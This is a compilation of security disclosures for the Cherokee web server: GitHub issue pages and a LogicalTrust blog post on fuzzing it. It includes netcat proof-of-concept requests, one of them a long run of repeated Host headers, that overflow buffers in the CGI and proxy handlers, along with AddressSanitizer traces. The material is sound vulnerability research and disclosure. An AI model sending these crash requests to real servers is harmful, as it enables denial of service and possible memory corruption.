bnRlbnQtU2VjdXJpdHktUG9saWN5OiAxMjcuMC4wLjEKWC1Db250ZW50LVR5cGUtT3B0aW9uczogMTI3LjAuMC4xClgtRnJhbWUtT3B0aW9uczogMTI3LjAuMC4xClgtWFNTLVByb3RlY3Rpb246IDEyNy4wLjAuMQpYLVdhcC1Qcm9maWxlOiAxMjcuMC4wLjEKCgo=' | base64 -d | nc 127.0.0.1 80

```
### ASAN

```
==26982==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6180000117c0 at pc 0x559e00d26059 bp 0x7f01f18e9250 sp 0x7f01f18e9240
READ of size 8 at 0x6180000117c0 thread T4
    #0 0x559e00d26058 in cherokee_services_client_spawn /home/mmm/fuzz/webserver/cherokee/services-client.c:201
    #1 0x559e00d5dd3c in fork_and_execute_cgi_via_spawner /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:802
    #2 0x559e00d5a5a8 in cherokee_handler_cgi_init /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:382
    #3 0x559e00dd244c in cherokee_handler_init /home/mmm/fuzz/webserver/cherokee/handler.c:93
    #4 0x559e00dcf233 in cherokee_connection_open_request /home/mmm/fuzz/webserver/cherokee/connection.c:2678
    #5 0x559e00d0b889 in process_active_connections /home/mmm/fuzz/webserver/cherokee/thread.c:1165
    #6 0x559e00d11549 in cherokee_thread_step_MULTI_THREAD /home/mmm/fuzz/webserver/cherokee/thread.c:2086
    #7 0x559e00d05300 in thread_routine /home/mmm/fuzz/webserver/cherokee/thread.c:99
    #8 0x7f01f69f46da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)
    #9 0x7f01f651988e in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x12188e)

0x6180000117c0 is located 0 bytes to the right of 832-byte region [0x618000011480,0x6180000117c0)
allocated by thread T4 here:
    #0 0x7f01f6f22b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
    #1 0x559e00d5908e in cherokee_handler_cgi_new /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:124
    #2 0x559e00dcd8b0 in cherokee_connection_create_handler /home/mmm/fuzz/webserver/cherokee/connection.c:2446
    #3 0x559e00d0b1f1 in process_active_connections /home/mmm/fuzz/webserver/cherokee/thread.c:1104
    #4 0x559e00d11549 in cherokee_thread_step_MULTI_THREAD /home/mmm/fuzz/webserver/cherokee/thread.c:2086
    #5 0x559e00d05300 in thread_routine /home/mmm/fuzz/webserver/cherokee/thread.c:99
    #6 0x7f01f69f46da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)

Thread T4 created by T0 here:
    #0 0x7f01f6e7bd2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)
    #1 0x559e00d06219 in cherokee_thread_new /home/mmm/fuzz/webserver/cherokee/thread.c:247
    #2 0x559e00cee73f in initialize_server_threads /home/mmm/fuzz/webserver/cherokee/server.c:671
    #3 0x559e00cf0a05 in cherokee_server_initialize /home/mmm/fuzz/webserver/cherokee/server.c:1053
    #4 0x559e00c9476f in common_server_initialization /home/mmm/fuzz/webserver/cherokee/main_worker.c:255
    #5 0x559e00c951f7 in main /home/mmm/fuzz/webserver/cherokee/main_worker.c:393
    #6 0x7f01f6419b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/mmm/fuzz/webserver/cherokee/services-client.c:201 in cherokee_services_client_spawn
Shadow bytes around the buggy address:
  0x0c307fffa2a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c307fffa2b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c307fffa2c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c307fffa2d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c307fffa2e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c307fffa2f0: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa
  0x0c307fffa300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c307fffa310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c307fffa320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c307fffa330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c307fffa340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==26982==ABORTING

```
### Setup:

* Ubuntu 18.04 64 bit
* source code from github, commit [9a75e65](https://github.com/cherokee/webserver/commit/9a75e65b876bcc376cb6b379dca1f7ce4a055c59)
* build command:

```
ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes LDFLAGS="-lasan" LDADD="-lasan" CFLAGS="-fsanitize=address -ggdb -O0 -fprofile-arcs -ftest-coverage" ./configure --prefix=`pwd`/bin --enable-trace --enable-static-module=all --enable-static --enable-shared=no
make

```

* files in webroot `mkdir /var/www/test{1..20}; for i in` seq 1 20`; do echo test > test$i/test.html; done`
* configuration file [cherokee.txt](https://github.com/cherokee/webserver/files/3432046/cherokee.txt)

found by: Mateusz Kocielski, Michał Dardas from LogicalTrust

## Metadata

### Assignees

* [![@skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)skinkie](/skinkie)
### Labels

[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d102d0aa_20250121_011114.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1226)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1226)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cherokee%2Fwebserver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cherokee](/cherokee)
/
**[webserver](/cherokee/webserver)**
Public

* [Notifications](/login?return_to=%2Fcherokee%2Fwebserver) You must be signed in to change notification settings
* [Fork
  104](/login?return_to=%2Fcherokee%2Fwebserver)
* [Star
   567](/login?return_to=%2Fcherokee%2Fwebserver)

* [Code](/cherokee/webserver)
* [Issues
  423](/cherokee/webserver/issues)
* [Pull requests
  11](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects
  0](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

Additional navigation options

* [Code](/cherokee/webserver)
* [Issues](/cherokee/webserver/issues)
* [Pull requests](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

# incorrectly used ipv6 in proxy connection #1226

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[incorrectly used ipv6 in proxy connection](#top)#1226Copy linkAssignees [![skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)](/skinkie)Labels[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=80)
## Description

![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=48)[mmmds](https://github.com/mmmds)opened [on Jul 25, 2019](https://github.com/cherokee/webserver/issues/1226#issue-472907578)

A socket structure is incorrectly used as ipv6 while connecting to a proxy server.

### PoC

```
echo -e "GET /test8/test.html HTTP/1.0\nUser-Agent: python\n\n" | nc 127.0.0.1 80

```
### ASAN

```
==27029==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60600001cd98 at pc 0x55ea3748a492 bp 0x7f6bc42eca90 sp 0x7f6bc42eca80
READ of size 16 at 0x60600001cd98 thread T1
    #0 0x55ea3748a491 in cherokee_socket_update_from_addrinfo /home/mmm/fuzz/webserver/cherokee/socket.c:396
    #1 0x55ea3752b4c0 in cherokee_handler_proxy_conn_init_socket /home/mmm/fuzz/webserver/cherokee/proxy_hosts.c:465
    #2 0x55ea37521029 in cherokee_handler_proxy_init /home/mmm/fuzz/webserver/cherokee/handler_proxy.c:975
    #3 0x55ea3758544c in cherokee_handler_init /home/mmm/fuzz/webserver/cherokee/handler.c:93
    #4 0x55ea37582233 in cherokee_connection_open_request /home/mmm/fuzz/webserver/cherokee/connection.c:2678
    #5 0x55ea374be889 in process_active_connections /home/mmm/fuzz/webserver/cherokee/thread.c:1165
    #6 0x55ea374c4549 in cherokee_thread_step_MULTI_THREAD /home/mmm/fuzz/webserver/cherokee/thread.c:2086
    #7 0x55ea374b8300 in thread_routine /home/mmm/fuzz/webserver/cherokee/thread.c:99
    #8 0x7f6bc7b316da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)
    #9 0x7f6bc765688e in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x12188e)

0x60600001cda0 is located 0 bytes to the right of 64-byte region [0x60600001cd60,0x60600001cda0)
allocated by thread T0 here:
    #0 0x7f6bc805fb50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
    #1 0x7f6bc763a4c4  (/lib/x86_64-linux-gnu/libc.so.6+0x1054c4)
    #2 0x7f6bc763cce3 in getaddrinfo (/lib/x86_64-linux-gnu/libc.so.6+0x107ce3)
    #3 0x7f6bc801825a  (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x9725a)
    #4 0x55ea3744c08a in cherokee_gethostbyname /home/mmm/fuzz/webserver/cherokee/util.c:793
    #5 0x55ea37477a31 in entry_fill_up /home/mmm/fuzz/webserver/cherokee/resolv_cache.c:96
    #6 0x55ea374784b4 in table_add_new_entry /home/mmm/fuzz/webserver/cherokee/resolv_cache.c:227
    #7 0x55ea3747888b in cherokee_resolv_cache_get_ipstr /home/mmm/fuzz/webserver/cherokee/resolv_cache.c:263
    #8 0x55ea374d0a09 in set_host /home/mmm/fuzz/webserver/cherokee/source.c:289
    #9 0x55ea374d0b3c in cherokee_source_configure /home/mmm/fuzz/webserver/cherokee/source.c:304
    #10 0x55ea374a4c9f in add_source /home/mmm/fuzz/webserver/cherokee/server.c:1243
    #11 0x55ea374981e7 in cherokee_config_node_while /home/mmm/fuzz/webserver/cherokee/config_node.c:226
    #12 0x55ea374a8f37 in configure_server /home/mmm/fuzz/webserver/cherokee/server.c:1657
    #13 0x55ea374a98ad in cherokee_server_read_config_file /home/mmm/fuzz/webserver/cherokee/server.c:1751
    #14 0x55ea37447644 in common_server_initialization /home/mmm/fuzz/webserver/cherokee/main_worker.c:245
    #15 0x55ea374481f7 in main /home/mmm/fuzz/webserver/cherokee/main_worker.c:393
    #16 0x7f6bc7556b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

Thread T1 created by T0 here:
    #0 0x7f6bc7fb8d2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)
    #1 0x55ea374b9219 in cherokee_thread_new /home/mmm/fuzz/webserver/cherokee/thread.c:247
    #2 0x55ea374a173f in initialize_server_threads /home/mmm/fuzz/webserver/cherokee/server.c:671
    #3 0x55ea374a3a05 in cherokee_server_initialize /home/mmm/fuzz/webserver/cherokee/server.c:1053
    #4 0x55ea3744776f in common_server_initialization /home/mmm/fuzz/webserver/cherokee/main_worker.c:255
    #5 0x55ea374481f7 in main /home/mmm/fuzz/webserver/cherokee/main_worker.c:393
    #6 0x7f6bc7556b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/mmm/fuzz/webserver/cherokee/socket.c:396 in cherokee_socket_update_from_addrinfo
Shadow bytes around the buggy address:
  0x0c0c7fffb960: fa fa fa fa 00 00 00 00 00 00 03 fa fa fa fa fa
  0x0c0c7fffb970: 00 00 00 00 00 00 06 fa fa fa fa fa 00 00 00 00
  0x0c0c7fffb980: 00 00 03 fa fa fa fa fa 00 00 00 00 00 00 06 fa
  0x0c0c7fffb990: fa fa fa fa 00 00 00 00 00 00 04 fa fa fa fa fa
  0x0c0c7fffb9a0: 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00
=>0x0c0c7fffb9b0: 00 00 00[00]fa fa fa fa 00 00 00 00 00 00 00 fa
  0x0c0c7fffb9c0: fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa
  0x0c0c7fffb9d0: 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00
  0x0c0c7fffb9e0: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 fa
  0x0c0c7fffb9f0: fa fa fa fa 00 00 00 00 00 00 00 01 fa fa fa fa
  0x0c0c7fffba00: 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==27029==ABORTING

```
### Setup:

* Ubuntu 18.04 64 bit
* source code from github, commit [9a75e65](https://github.com/cherokee/webserver/commit/9a75e65b876bcc376cb6b379dca1f7ce4a055c59)
* build command:

```
ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes LDFLAGS="-lasan" LDADD="-lasan" CFLAGS="-fsanitize=address -ggdb -O0 -fprofile-arcs -ftest-coverage" ./configure --prefix=`pwd`/bin --enable-trace --enable-static-module=all --enable-static --enable-shared=no
make

```

* files in webroot `mkdir /var/www/test{1..20}; for i in` seq 1 20`; do echo test > test$i/test.html; done`
* configuration file [cherokee.txt](https://github.com/cherokee/webserver/files/3432046/cherokee.txt)

found by: Mateusz Kocielski, Michał Dardas from LogicalTrust

## Metadata

### Assignees

* [![@skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)skinkie](/skinkie)
### Labels

[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from logicaltrust.net_8b271f1f_20250121_011114.html ===

Menu

[![](/images/logo.svg)](/en/)

* [Home](/en/)
* [Services](/en/#services)
* [Blog](/blog.html)
* [About us](/about.html)
* [Contact](#contact)

* [**EN**](/en/)
* [PL](/)

# [EN] A-Z: Cherokee

For the letter *c* we chose [Cherokee project](http://cherokee-project.com/). It is a web server written mainly in C language. What’s interesting, this server may be met on IoT devices including GoPro cameras.

![logo](/images/cherokee-logo.png)

Our approach to find bugs was quite similar to the previous ones, but we decided to extend it in some ways.

## Preparing

We started with preparing the environment for fuzzing.

```
$ git clone https://github.com/cherokee/webserver.git
```

During building we encountered a problem:

```
undefined reference to `rpl_malloc`
```

which was solved by setting `ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes`.
So finally, we were able to build with:

```
$ ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes LDFLAGS="-lasan" LDADD="-lasan" CFLAGS="-fsanitize=address -ggdb -O0 -fprofile-arcs -ftest-coverage" ./configure --prefix=`pwd`/bin --enable-trace --enable-static-module=all --enable-static --enable-shared=no
make
```

After building:
Run the main server

```
$ cherokee
```

and administration panel (with an option to listen on all network interfaces)

```
$ cherokee-admin -l 0.0.0.0
```
## Fuzzing

Our idea was to test [all handlers](https://cherokee-project.com/doc/modules_handlers.html) offered by the server. We enabled and made them available under paths `/test1`, `/test2`, …, `/test19`. Backed up configuration file is also available [here](https://raw.githubusercontent.com/LogicalTrust/materials/master/az/c/cherokee.txt).

Radamsa was run from a custom script. A few HTTP requests were taken as an input and after modification were sent to all handlers.

## Additional tools

To improve result analysis we set up two additional tools. The first one - *gcov*, was already configured during the building (with compiler flags `-fprofile-arcs -ftest-coverage`). This tool helps in measuring code coverage. After some time of fuzzing it was beneficial to verify through how many code paths we went through.

While the application was running, special files `*.gcda` were created. They can be converted to HTML files with ease to read statistics.

```
$ lcov --capture --directory . --output-file coverage.info
$ genhtml coverage.info --output-directory out
```

As the result, coverage report in form of HTML document will appear in `out` directory.

The second tool - OpenGrok, was set up to help reading the code. It’s a source code browser, supporting cross-reference navigation and search options in a browser. Its installation and configuration process is well documented on the [project’s page](https://github.com/oracle/opengrok).

## Results

By fuzzing we discovered several crashes in various handlers. All were reported on the Cherokee’s GitHub.

* <https://github.com/cherokee/webserver/issues/1226>
* <https://github.com/cherokee/webserver/issues/1225>
* <https://github.com/cherokee/webserver/issues/1224>
* <https://github.com/cherokee/webserver/issues/1222>
* <https://github.com/cherokee/webserver/issues/1221>

One of the interesting findings was in code responsible for handling headers before passing them to the CGI.

```
typedef struct {
        cherokee_handler_cgi_base_t base;

        int               post_data_sent;    /* amount POSTed to the CGI */
        int               pipeInput;         /* read from the CGI */
        int               pipeOutput;        /* write to the CGI */
        char             *envp[ENV_VAR_NUM]; /* Environ variables for execve() */
        int               envp_last;
        pid_t             pid;               /* CGI pid */
} cherokee_handler_cgi_t;
```

Structure `cherokee_handler_cgi_t` has fixed size array for environmental variables including request headers. When the handler processes a request it adds entries without checking whether boundary value was reached.

```
310     cgi->envp[cgi->envp_last] = entry;
311     cgi->envp_last++;
```

So, sending a request with enough headers causes writing outside the array.

```
echo -e 'GET /test10/test.html HTTP/1.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.170141183460469231731687303715884105727\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 4294967295.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nUser-Agent: python\n\n' | nc 127.0.0.1 80
```

```
=================================================================
==10864==ERROR: AddressSanitizer: SEGV on unknown address 0x6180001cb3c0 (pc 0x55c74bfd2f94 bp 0x7f6bac2e6220 sp 0x7f6bac2e61f0 T7)
==10864==The signal is caused by a WRITE memory access.
    #0 0x55c74bfd2f93 in cherokee_handler_cgi_add_env_pair /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:310
    #1 0x55c74c02d6e4 in foreach_header_add_unknown_variable /home/mmm/fuzz/webserver/cherokee/handler_cgi_base.c:664
    #2 0x55c74c09fe32 in cherokee_header_foreach_unknown /home/mmm/fuzz/webserver/cherokee/header.c:1220
    #3 0x55c74c02db36 in cherokee_handler_cgi_base_build_envp /home/mmm/fuzz/webserver/cherokee/handler_cgi_base.c:696
    #4 0x55c74bfd30f3 in add_environment /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:328
    #5 0x55c74bfd6912 in fork_and_execute_cgi_via_spawner /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:787
    #6 0x55c74bfd35a8 in cherokee_handler_cgi_init /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:382
    #7 0x55c74c04b44c in cherokee_handler_init /home/mmm/fuzz/webserver/cherokee/handler.c:93
    #8 0x55c74c048233 in cherokee_connection_open_request /home/mmm/fuzz/webserver/cherokee/connection.c:2678
    #9 0x55c74bf84889 in process_active_connections /home/mmm/fuzz/webserver/cherokee/thread.c:1165
    #10 0x55c74bf8a549 in cherokee_thread_step_MULTI_THREAD /home/mmm/fuzz/webserver/cherokee/thread.c:2086
    #11 0x55c74bf7e300 in thread_routine /home/mmm/fuzz/webserver/cherokee/thread.c:99
    #12 0x7f6bb2b166da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)
    #13 0x7f6bb263b88e in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x12188e)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:310 in cherokee_handler_cgi_add_env_pair
Thread T7 created by T0 here:
    #0 0x7f6bb2f9dd2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)
    #1 0x55c74bf7f219 in cherokee_thread_new /home/mmm/fuzz/webserver/cherokee/thread.c:247
    #2 0x55c74bf6773f in initialize_server_threads /home/mmm/fuzz/webserver/cherokee/server.c:671
    #3 0x55c74bf69a05 in cherokee_server_initialize /home/mmm/fuzz/webserver/cherokee/server.c:1053
    #4 0x55c74bf0d76f in common_server_initialization /home/mmm/fuzz/webserver/cherokee/main_worker.c:255
    #5 0x55c74bf0e1f7 in main /home/mmm/fuzz/webserver/cherokee/main_worker.c:393
    #6 0x7f6bb253bb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

==10864==ABORTING
```
### XSS

Despite the bugs discovered by fuzzing, two reflected XSS vulnerabilities were found manually:

* <https://github.com/cherokee/webserver/issues/1223>
* <https://github.com/cherokee/webserver/issues/1227>

